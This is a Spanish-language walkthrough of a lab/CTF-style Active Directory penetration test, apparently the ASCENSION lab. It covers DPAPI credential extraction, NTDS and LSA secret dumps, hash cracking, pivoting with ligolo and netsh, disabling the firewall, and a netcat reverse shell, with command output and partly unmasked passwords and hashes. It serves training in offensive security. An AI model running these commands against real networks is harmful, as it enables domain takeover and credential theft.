Se procedió a la implementación de SharpDPAPI con el objetivo de extraer credenciales del sistema. Para ello, se suministró la contraseña disponible, lo que permitió obtener las credenciales del usuario svc_backup.

```powershell
PS C:\Users\Administrator\Documents> upload SharpDPAPI.exe

Info: Uploading SharpDPAPI.exe to C:\Users\Administrator\Documents\SharpDPAPI.exe

Data: 202752 bytes of 202752 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents> .\SharpDPAPI.exe credentials /password:D43d4lusB1ll1ngB055  

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.11.3


[*] Action: User DPAPI Credential Triage

[*] Will decrypt user masterkeys with password: D43d4lusB1ll1ngB055

[*] Triaging Credentials for ALL users

Folder       : C:\Users\Administrator\AppData\Local\Microsoft\Credentials\

  CredFile           : 6C0FA35116FC27371A650B528FAEE6C0

    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
    size             : 560
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}

Folder       : C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\

  CredFile           : C48FA9BC4637C67CB306A191C3C91E23

    guidMasterKey    : {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}
    size             : 430
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 10/14/2020 5:35:22 AM
    TargetName       : Domain:interactive=DAEDALUS\svc_backup
    TargetAlias      :
    Comment          :
    UserName         : DAEDALUS\svc_backup
    Credential       : jkQ**********

PS C:\Users\Administrator\Documents>
```

Se llevó a cabo una verificación de las credenciales del usuario svc_backup utilizando CrackMapExec, confirmando que estas credenciales son válidas a nivel de dominio.

```bash
❯ crackmapexec smb dc1.daedalus.local -u svc_backup -p jkQ**********
SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
SMB         daedalus.local  445    DC1              [+] daedalus.local\svc_backup:jkQ**********
```

Con el fin de realizar una enumeración exhaustiva del dominio, se utilizó BloodHound. Se autenticó en BloodHound utilizando las credenciales del usuario svc_backup, y se guardó toda la información recopilada en un archivo ZIP para un posterior análisis y revisión.

```powershell
❯ bloodhound-python -u svc_backup -p jkQ********** -ns 192.168.10.6 -d daedalus.local -c All --zip  
INFO: Found AD domain: daedalus.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc1.daedalus.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to GC LDAP server: dc1.daedalus.local
INFO: Connecting to LDAP server: dc1.daedalus.local
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 7 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WEB01.daedalus.local
INFO: Querying computer: DC1.daedalus.local
INFO: Done in 00M 34S
INFO: Compressing output into 20230901100806_bloodhound.zip
```

Tras cargar el archivo ZIP en BloodHound y analizar los datos, se identificó que el usuario svc_backup es miembro del grupo "Remote Management Users". Esto indica que el usuario tiene permisos para conectarse a WinRM (Windows Remote Management), lo que facilita la administración remota de sistemas Windows en la red.

Se procedió a establecer una conexión utilizando Evil-WinRM con el usuario svc_backup hacia el equipo DC1. Como resultado, se obtuvo una sesión de PowerShell que permitió leer una nueva bandera.

```powershell
❯ evil-winrm -i dc1.daedalus.local -u svc_backup -p jkQ********** 
PS C:\Users\svc_backup.DAEDALUS\Documents> whoami
daedalus\svc_backup
PS C:\Users\svc_backup.DAEDALUS\Documents> type ..\Desktop\flag.txt
ASCENSION{***********8****}
PS C:\Users\svc_backup.DAEDALUS\Documents>
```
Se procedió a utilizar el programa WinPEAS.exe para realizar una enumeración exhaustiva de la máquina. El archivo WinPEAS.exe fue cargado y ejecutado exitosamente en el sistema.

```powershell
PS C:\Users\svc_backup.DAEDALUS\Documents> upload winpeas.exe

Info: Uploading winpeas.exe to C:\Users\svc_backup.DAEDALUS\Documents\winpeas.exe  

Data: 3166888 bytes of 3166888 bytes copied

Info: Upload successful!

PS C:\Users\svc_backup.DAEDALUS\Documents> .\winpeas.exe
```

Entre la información recopilada por WinPEAS.exe, se identificó la existencia de otra unidad lógica, la unidad E:

```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 10 GB)(Permissions: Users [AppendData/CreateDirectories])
    E:\ (Type: Fixed)(Volume label: Backups)(Filesystem: NTFS)(Available space: 4 GB)(Permissions: Users [AppendData/CreateDirectories])
```

Se procedió a cambiar al directorio de la unidad E: y, tras explorar los directorios, se descubrió un archivo llamado Users.txt que contenía credenciales para el usuario Administrator.

```powershell
PS C:\Users\svc_backup.DAEDALUS\Documents> E:
PS E:\> dir

    Directory: E:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/13/2020   3:54 PM                Annual IT Compliance Report - Export  

PS E:\> cd 'Annual IT Compliance Report - Export'
PS E:\Annual IT Compliance Report - Export> dir

    Directory: E:\Annual IT Compliance Report - Export

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/10/2020   6:04 AM           4852 Builtin.txt
-a----       10/10/2020   6:04 AM            530 Daedalus.txt
-a----       10/10/2020   6:05 AM           2541 Users.txt

PS E:\Annual IT Compliance Report - Export> type Users.txt
Name	Type	Description
Administrator	User	DSRM Password: kF4d*********
.........................................................
PS E:\Annual IT Compliance Report - Export>
```

La contraseña descubierta para el usuario Administrator en el equipo DC1 es válida para la autenticación local. Sin embargo, al ser DC (Controlador de Dominio), existe la posibilidad de realizar un volcado del ntds (Servicio de directorio de Active Directory) para obtener todos los hashes de contraseñas almacenados en él. Esto proporcionaría acceso a las contraseñas de todos los usuarios del dominio.

Una vez obtenido el hash del usuario Administrator, podemos utilizarlo para autenticarnos en el equipo DC1 mediante Evil-WinRM, lo que nos brindará una sesión de PowerShell.

Además, si se realiza un volcado de los secretos LSA (Autoridad de seguridad local), es posible encontrar la contraseña en texto plano para el usuario Administrator. Esta contraseña también es válida, pero en este caso es a nivel de dominio. Utilizando esta contraseña, también podríamos conectarnos al DC1 utilizando Evil-WinRM.

```bash
❯ crackmapexec smb dc1.daedalus.local -u Administrator -p 'kF4d*********' --local-auth
SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:DC1) (signing:True) (SMBv1:False)  
SMB         daedalus.local  445    DC1              [+] DC1\Administrator:kF4d********* (Pwn3d!)

❯ crackmapexec smb dc1.daedalus.local -u Administrator -p 'kF4d*********' --local-auth --ntds drsuapi
SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:DC1) (signing:True) (SMBv1:False)
SMB         daedalus.local  445    DC1              [+] DC1\Administrator:kF4d********* (Pwn3d!)
SMB         daedalus.local  445    DC1              [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         daedalus.local  445    DC1              Administrator:500:aad3b435b514*****************ff633d308be8e06dbb4e2e88783533:::
SMB         daedalus.local  445    DC1              Guest:501:aad3b435b51404e*****************d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         daedalus.local  445    DC1              krbtgt:502:aad3b435b5140*****************:3e1e73de1f69e094386b8496fdbdaa90:::
SMB         daedalus.local  445    DC1              daedalus.local\elliot:1112:aad3b4*****************35b51404ee:74fdf381a94e1e446aaedf1757419dcd:::
SMB         daedalus.local  445    DC1              daedalus.local\svc_backup:1602:aad3b*****************04ee:f913cd9d773be0d48389d45a20b6364a:::
SMB         daedalus.local  445    DC1              daedalus.local\billing_user:1603:aad3b435b*****************c86ce4386582442450feed8ce53:::  
SMB         daedalus.local  445    DC1              DC1$:1000:aad3b435b51404eeaa*****************1e5aa0c0fd1fc33a8fb:::
SMB         daedalus.local  445    DC1              WEB01$:1109:aad3b435b51404ee*****************ef31ca13817f6d6c73b3c26b1a:::
SMB         daedalus.local  445    DC1              MEGAAIRLINE$:1108:aad3b435b51*****************1f2b98c63593309aa61ae76d:::
```

```
❯ evil-winrm -i dc1.daedalus.local -u Administrator -H a3ff63*****************  
PS C:\Users\Administrator\Documents> whoami
daedalus\administrator
PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
ASCENSION{*****************}
PS C:\Users\Administrator\Documents>
```

Se realizaron varias acciones para establecer la conexión entre los equipos y explorar la red:

1. Se identificó que había una interfaz de red adicional en la red 192.168.11.0/24 además de la interfaz de dominio estándar.
2. Se utilizó el módulo PowerView.ps1 para enumerar los dominios y se encontró otro dominio llamado megaairline.local que estaba en relación con el dominio daedalus.local.
3. Se resolvió el problema de la conectividad entre los equipos mediante ligolo. Se configuró un redireccionamiento en ligolo desde el equipo WEB01 al equipo local para el puerto 8888.
4. Se inició una sesión de Evil-WinRM desde el equipo DC1 al equipo WEB01 a través del puerto 8888, estableciendo así una conexión entre los dos equipos.
5. Se agregó la subred 192.168.10.0/24 a la interfaz de ligolo para permitir la conexión con todos los equipos de la red.
6. Se escaneó la subred 192.168.11.0/24 utilizando CrackMapExec y se identificaron tres equipos: DC1, DC2 y MS01, pertenecientes al dominio megaairline.local.
7. Se agregaron las direcciones IP de los equipos identificados junto con sus dominios correspondientes al archivo /etc/hosts para facilitar la resolución de nombres.
8. Se realizó un escaneo de puertos en la subred 192.168.11.0/24 con nmap, revelando que el equipo MS01 tenía el puerto 80 abierto, lo que indica la presencia de un posible servicio web en ese equipo.

```powershell
PS C:\Users\Administrator\Documents> Import-Module .\PowerView.ps1  
PS C:\Users\Administrator\Documents> Invoke-MapDomainTrust

SourceName      : daedalus.local
TargetName      : megaairline.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 10/10/2020 5:48:47 PM
WhenChanged     : 9/1/2023 2:59:58 AM

PS C:\Users\Administrator\Documents>
```

```powershell
[Agent : WEB01\svc_dev@WEB01] » listener_add --addr 192.168.10.39:8888 --to 10.10.14.10:8888  
INFO[0173] Listener created on remote agent! 
[Agent : WEB01\svc_dev@WEB01] »
```

```powershell
PS C:\Users\Administrator\Documents> .\agent.exe -connect 192.168.10.39:8888 -ignore-cert  
```

```bash
Agent : WEB01\svc_dev@WEB01] » 
INFO[0179] Agent joined.           name="DAEDALUS\\Administrator@DC1" remote="10.10.14.10:47204"  
[Agent : WEB01\svc_dev@WEB01] » session
? Specify a session : 2 - DAEDALUS\Administrator@DC1 - 10.10.14.10:47204
[Agent : DAEDALUS\Administrator@DC1] » start
INFO[0190] Starting tunnel to DAEDALUS\Administrator@DC1 
[Agent : DAEDALUS\Administrator@DC1] »
```

```bash
❯ sudo ip route add 192.168.11.0/24 dev ligolo

❯ ping -c1 -w1 192.168.11.6
PING 192.168.11.6 (192.168.11.6) 56(84) bytes of data.
64 bytes from 192.168.11.6: icmp_seq=1 ttl=64 time=162 ms

--- 192.168.11.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 161.931/161.931/161.931/0.000 ms
```

```bash
❯ crackmapexec smb 192.168.11.0/24
SMB         192.168.11.6    445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)
SMB         192.168.11.201  445    DC2              [*] Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)
SMB         192.168.11.210  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:megaairline.local) (signing:False) (SMBv1:False)  
```

```bash
❯ echo "192.168.11.210 ms01.megaairline.local" | sudo tee -a /etc/hosts

❯ echo "192.168.11.201 megaairline.local dc2.megaairline.local" | sudo tee -a /etc/hosts  
```

```bash
❯ nmap ms01.megaairline.local -Pn
Nmap scan report for ms01.megaairline.local (192.168.11.210)  
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

❯ nmap dc2.megaairline.local -Pn
Nmap scan report for dc2.megaairline.local (192.168.11.201)  
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

  
Luego de explorar la página web y encontrarnos con la página por defecto de IIS, utilizamos la herramienta wfuzz para realizar un ataque de fuerza bruta en los directorios de la web utilizando un diccionario. Esta exploración nos llevó al descubrimiento del directorio /secretserver.

Al acceder a este directorio, nos encontramos con un formulario de inicio de sesión de Thycotic que requiere credenciales para acceder.

Durante la fase de volcado del ntds de DC1, se pudo observar el hash NT del usuario "elliot". Utilizando la herramienta John the Ripper, logramos romper este hash y obtener la contraseña correspondiente.

```bash
❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=NT  
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 XOP 4x2])
Press 'q' or Ctrl-C to abort, almost any other key for status
84@m!n@9         (?)
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```


Resulta interesante destacar que las credenciales obtenidas a través del hash NT del usuario "elliot" también son válidas para la autenticación mediante SMB (Server Message Block) en el nuevo dominio. Esto sugiere una posible reutilización de credenciales entre los dominios, lo que puede tener implicaciones significativas en términos de la seguridad de la red y la gestión de privilegios.

```bash
❯ crackmapexec smb dc2.megaairline.local -u elliot -p '84@m!n@9'
SMB         megaairline.local 445    DC2              [*] Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
SMB         megaairline.local 445    DC2              [+] megaairline.local\elliot:84@m!n@9
```

Las credenciales obtenidas tambien podemos usarlas para el login de `thycotic` autenticandonos como el usuario `elliot`, de esta manera obtenemos acceso

En el apartado "Admin > Scripts" de la interfaz, observamos una serie de scripts disponibles, específicamente en la sección de SSH. Al intentar ejecutar uno de estos scripts, se nos solicita información adicional. Para el servidor, seleccionamos 127.0.0.1, y utilizamos las credenciales de elliot a nivel de dominio. Este proceso parece establecer una conexión SSH interna y ejecutar un comando. Aunque se solicita un argumento, por el momento lo dejaremos en blanco.

Después de enviar la solicitud, observamos un error relacionado con la ejecución de un comando en la consola, lo que sugiere que se ha establecido una conexión SSH interna y se ha intentado ejecutar el comando proporcionado.

Para probar la funcionalidad, proporcionamos un simple comando "whoami" como argumento. Al recibir la respuesta, confirmamos que el comando se ejecutó como el usuario elliot, lo que nos indica que podemos ejecutar comandos de forma remota.

Finalmente, ajustamos el comando y solicitamos la lectura de la bandera en el escritorio de este usuario.

![](/assets/images/ASC1.jpg)

Es importante recordar que actualmente no contamos con una conexión directa a la máquina destino. Para facilitar algunas tareas, utilizaremos el equipo DC1 como intermediario.

Antes de proceder, habilitaremos el Protocolo de Escritorio Remoto (RDP) en la máquina objetivo. Una vez habilitado, nos conectaremos a la máquina utilizando una herramienta como xfreerdp, que nos permitirá acceder de forma remota al escritorio de la máquina objetivo desde nuestra máquina local.

```bash
 crackmapexec smb dc1.daedalus.local -u Administrator -p pleasefastenyourseatbelts01! -M rdp -o ACTION=enable
SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
SMB         daedalus.local  445    DC1              [+] daedalus.local\Administrator:pleasefastenyourseatbelts01! (Pwn3d!)
RDP         daedalus.local  445    DC1              [+] RDP enabled successfully

❯ xfreerdp /u:Administrator /p:pleasefastenyourseatbelts01! /v:dc1.daedalus.local /dynamic-resolution /cert:ignore
```

Para configurar un servidor HTTP en el equipo DC1, que tiene conexión directa con el otro dominio, primero subiremos un archivo MSI de Python y lo instalaremos para poder utilizarlo.

Una vez instalado Python, podremos usarlo para crear un servidor HTTP en el directorio "Documents", desde donde podremos compartir cualquier archivo que deseemos a través de un servidor HTTP en el DC1.

```powershell
PS C:\Users\Administrator\Documents> upload python-3.4.4.amd64.msi

Info: Uploading python-3.4.4.amd64.msi to C:\Users\Administrator\Documents\python-3.4.4.amd64.msi  

Data: 34739540 bytes of 34739540 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents>
```

Aunque enfrentamos una limitación adicional debido al firewall, podemos deshabilitarlo fácilmente para permitir el tráfico necesario. Esto nos facilitará la configuración y el funcionamiento del servidor HTTP en el equipo DC1.

```powershell
PS C:\Users\Administrator\Documents> Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False  
PS C:\Users\Administrator\Documents>
```

A continuación, procederemos a subir el archivo `netcat.exe` al servidor HTTP que hemos creado en el equipo DC1.

Una vez subido el archivo, utilizaremos el comando `curl` ejecutado como el usuario `elliot` para realizar una solicitud al archivo `netcat.exe` compartido en el DC1 y lo guardaremos en el directorio `C:\ProgramData`. Este proceso nos permitirá transferir el archivo `netcat.exe` al equipo DC1 para su posterior uso.

```powershell
PS C:\Users\Administrator\Documents> upload netcat.exe

Info: Uploading netcat.exe to C:\Users\Administrator\Documents\netcat.exe  

Data: 58260 bytes of 58260 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents>
```

```bash
curl 192.168.11.6/netcat.exe -o C:\ProgramData\netcat.exe 
```

Para establecer una conexión de reverse shell, utilizaremos el comando `netsh` en el equipo DC1 para redirigir el tráfico del puerto 4444 hacia el equipo WEB01, y desde allí hacia nuestro equipo a través del mismo puerto.

Este enfoque nos permitirá configurar la redirección de puertos de manera que cualquier tráfico entrante al puerto 4444 del DC1 se reenvíe primero a WEB01 y luego a nuestro equipo, lo que nos permitirá establecer una conexión de reverse shell de manera efectiva.

```powershell
PS C:\Users\Administrator\Documents> python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 ...
192.168.11.210 - - "GET /netcat.exe HTTP/1.1" 200 -
```

```powershell
PS C:\Users\Administrator\Documents> netsh interface portproxy add v4tov4 listenaddress=192.168.11.6 listenport=4444 connectaddress=192.168.10.39 connectport=4444  
PS C:\Users\Administrator\Documents>
```

```powershell
PS C:\Users\Administrator\Documents> netsh interface portproxy add v4tov4 listenaddress=192.168.10.39 listenport=4444 connectaddress=10.10.14.10 connectport=4444  
PS C:\Users\Administrator\Documents>
```

Entiendo. Para completar la operación, ejecutaremos el archivo `netcat.exe` en la página web del servidor DC1. Esto enviará una shell inversa a DC1, que después de redirigir el tráfico, finalmente la enviará a nuestro equipo atacante.

Una vez completado este proceso, recibiremos una shell como el usuario `elliot` en el equipo MS01. En el directorio de descargas de este equipo, encontramos el instalador de Slack. Esta podría ser una pista importante. Tras una exhaustiva enumeración, descubrimos una base de datos con el nombre "7" dentro del directorio de Chrome, la cual copiaremos a la ruta C:\ProgramData.

```bash
cmd /c C:\ProgramData\netcat.exe -e powershell 192.168.11.6 4444  
```

```powershell
❯ netcat -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.13.38.20
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Users\elliot> whoami
megaairline\elliot
PS C:\Users\elliot>
```

```powershell
PS C:\Users\elliot\Downloads> dir

    Directory: C:\Users\elliot\Downloads

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/16/2020   8:00 AM       83040752 SlackSetup.exe  

PS C:\Users\elliot\Downloads>
```

```powershell
PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00> dir

    Directory: C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00

Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----       10/16/2020   9:28 AM         170673 7                             

PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00> cp 7 C:\ProgramData  
PS C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00>
```

Parece que hemos descubierto una contraseña asociada al usuario "elliot", la cual se menciona como una cuenta administrativa en el contexto de un sistema. Sin embargo, al revisar los administradores locales, encontramos que "elliot" está presente solo a nivel local y no a nivel de dominio. A pesar de esto, al intentar usar la contraseña asociada a "elliot", confirmamos que es válida a nivel local.

Sin embargo, al acceder al sistema mediante RDP y abrir una terminal de comando, descubrimos que tenemos privilegios de administrador, lo que nos permite leer la flag sin problemas. Esto indica que la contraseña de "elliot" otorga privilegios de administrador a nivel local en la máquina, lo que nos permite acceder a la flag.

```powershell
PS C:\ProgramData> Import-Module .\Get-Strings.ps1
PS C:\ProgramData> Get-Strings 7 | Select-String password

needs_initial_password_setF"
text"6local account username: elliot password: LetMeInAgain!{
text"6local account username: elliot password: LetMeInAgain!"
text"!MS01 admin account and password: {
text";MS01 admin account and password: ```elliot LetMeInAgain!```"  

PS C:\ProgramData>
```

```powershell
PS C:\ProgramData> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain  

Members

-------------------------------------------------------------------------------
Administrator
elliot
MEGAAIRLINE\Domain Admins
The command completed successfully.

PS C:\ProgramData>
```

```bash
❯ crackmapexec smb ms01.megaairline.local -u elliot -p LetMeInAgain! --local-auth 
SMB         ms01.megaairline.local 445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)  
SMB         ms01.megaairline.local 445    MS01             [+] MS01\elliot:LetMeInAgain!
```

```powershell
❯ xfreerdp /u:elliot /p:LetMeInAgain! /v:ms01.megaairline.local /dynamic-resolution /cert:ignore  
```

Usaremos SharpDPAPI nuevamente para extraer la contraseña del usuario "Administrator" en MS01. Es importante tener en cuenta que es probable que esta contraseña sea válida solo a nivel local en el equipo MS01.

```powershell
PS C:\Users\elliot.MS01\Desktop> curl 192.168.11.6/SharpDPAPI.exe -o SharpDPAPI.exe
PS C:\Users\elliot.MS01\Desktop> .\SharpDPAPI.exe machinetriage

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.11.3


[*] Action: Machine DPAPI Credential, Vault, and Certificate Triage

[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
[*] RevertToSelf()

[*] Secret  : DPAPI_SYSTEM
[*]    full: 487772FBFFEDCCD08B08239AF25F7C42A0C2AB7636CBEDE3241336B34893574F96C27A7411F18A6C
[*]    m/u : 487772FBFFEDCCD08B08239AF25F7C42A0C2AB76 / 36CBEDE3241336B34893574F96C27A7411F18A6C  

[*] SYSTEM master key cache:

{236ba6f2-6d51-4312-beb2-365eb2897601}:E9AB8AB7568ABEEA751B1D5B4A8C14A682DE5CC4
{6af669bc-5e57-413c-ba26-6d63fb62c794}:78EF352E05532ADF635D9AFEEC839B96E99601A6
{b88476d3-b611-4e16-be7f-8525fb5dcd4f}:14F7A4B882D7D01EDF4C9015E10868649F58D159
{bd0e6c0c-1301-4c56-90f0-4dd4504dc8ce}:F2FBB1F90F09F29D7B20D4366BCE33C9B439CC81
{c21c474c-ad42-425f-babf-623340194247}:451EE9B8011CEF62A3404F44A64B2ACD93CD9FDB
{360b584f-7027-4f23-85ad-b13720f57979}:58B9072F514E39AB9036140775FA34FE852924E4
{b0724227-4609-4b11-81ad-4694b3e3e947}:C5CCE9487809C753C814848080BF1DD16985B509
{e85f73ce-4638-49bf-a1b2-984e0be4890b}:1C834ECB6C3DC3502001A4974DDF46E01141FDDF
{f52cb0ce-0f39-422a-bff2-68b49e60beb5}:11D1FB8FB59C7E18C8600959C13DF23FE22C8ADE

[*] Triaging System Credentials

Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

  CredFile           : 7E6A4CF66305FBFB5B060CD27A723F46

    guidMasterKey    : {360b584f-7027-4f23-85ad-b13720f57979}
    size             : 576
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 10/14/2020 10:33:07 AM
    TargetName       : Domain:batch=TaskScheduler:Task:{A7499C51-AB7C-44BF-9314-6A305239E450}
    TargetAlias      :
    Comment          :
    UserName         : MS01\Administrator
    Credential       : FWErfsgt4ghd7f6dwx

PS C:\Users\elliot.MS01\Desktop>
```

Al comprobar la contraseña del usuario "Administrator" localmente con `crackmapexec`, recibimos una confirmación de que es válida, lo que nos indica que tenemos acceso total al sistema. Podemos proceder a conectarnos con `wmiexec` y obtener una shell de PowerShell como este usuario.

```bash
❯ crackmapexec smb ms01.megaairline.local -u Administrator -p FWE*************}f6dwx --local-auth
SMB         ms01.megaairline.local 445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)  
SMB         ms01.megaairline.local 445    MS01             [+] MS01\Administrator:FWErf*************}dwx (Pwn3d!)
```

```powershell
❯ impacket-wmiexec WORKGROUP/Administrator:FWEr*************}6dwx@ms01.megaairline.local -shell-type powershell  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> whoami
ms01\administrator

PS C:\> type C:\Users\Administrator\Desktop\flag.txt
ASCENSION{sL4ck*************}
```
Entiendo. Al realizar el volcado de los secretos LSA de este equipo, descubrimos varios hashes en formato mscash2, uno de los cuales corresponde a un usuario llamado "anna" que aún no hemos utilizado. Aunque el diccionario predeterminado "rockyou.txt" no resultó útil en este caso, al probar con contraseñas que tenemos del mismo laboratorio, descubrimos que "anna" reutiliza la contraseña del usuario "Administrator" en MS01.

```bash
❯ crackmapexec smb ms01.megaairline.local -u Administrator -p FWErfsgt4ghd7f6dwx --local-auth --lsa
SMB         ms01.megaairline.local 445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         ms01.megaairline.local 445    MS01             [+] MS01\Administrator:FWErfsgt4ghd7f6dwx (Pwn3d!)
SMB         ms01.megaairline.local 445    MS01             [+] Dumping LSA secrets
SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE.LOCAL/Administrator:$DCC2$10240#Administrator#3ea6e70c7142de7e521195f33086a2bf: (2021-06-09 12:56:43)
SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE.LOCAL/elliot:$DCC2$10240#elliot#1985a8159434672943be0d4f94cea4b2: (2020-10-16 15:54:05)
SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE.LOCAL/anna:$DCC2$10240#anna#beff6c5d84183e72d1ef69f18051ed49: (2020-10-14 14:54:00)
SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:aes256-cts-hmac-sha1-96:a134ed2a75cbd3ff0be93c11d979fecd5cf81ff7c9194b8eea3c368efb5d8b3c
SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:aes128-cts-hmac-sha1-96:a271a2cc8d68a84c3ee70450a976bfdc
SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:des-cbc-md5:c76e529e62c28ae0
SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:plain_password_hex:40e0e091a87bcb8ef7b8d715da6ebe499ab5fa7494a3d2c4f704a871f131ab5908d97abde6ef23214fd85d209067b0dc14b606407308a6fd5e190c465f91868de51efc531baae61087b2ad4fd5509433c3f9c648e130e4e3680f49acd3d94804a3d7437f859997d11ed885f8af3f937842004b7dfca47a2ac977534a4244bfcfa2fa73bd0cbf3618c54aff2e17fd54b7ad270c9c1c9c4f68277a19b8885a1d53cfa5f1e43e7f1bacfabcb6b2a8fa570bbe2310365d9b49aedf48c660cddf166f145ac7a9a72b584849ec7605719c3f71d0d132ab3824fac0db227a859af2148dbbd551824133acd775119b5b86c3d9ca  
SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:aad3b435b51404eeaad3b435b51404ee:1a60da9a2479af44780749249ed6248f:::
SMB         ms01.megaairline.local 445    MS01             dpapi_machinekey:0x487772fbffedccd08b08239af25f7c42a0c2ab76
dpapi_userkey:0x36cbede3241336b34893574f96c27a7411f18a6c
SMB         ms01.megaairline.local 445    MS01             NL$KM:33eb2a1da2aff443ecaf9f474df4857987a84e71648fd00f94e3041305cdda929bd1eb02ea266e4b0e77996a29737c20d1767bb63e7f42cf108aaa01d849883d
```

```bash
❯ john -w:passwords hashes
Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
Use the "--format=HMAC-MD5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 128/128 XOP 4x2])  
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 16 needed for performance.
FWErfsgt4ghd7f6dwx (MEGAAIRLINE.LOCAL/anna)
Use the "--show --format=mscash2" options to display all of the cracked passwords reliably
Session completed.
```

Después de verificar las credenciales con crackmapexec, confirmamos que son válidas a nivel de dominio.

```bash
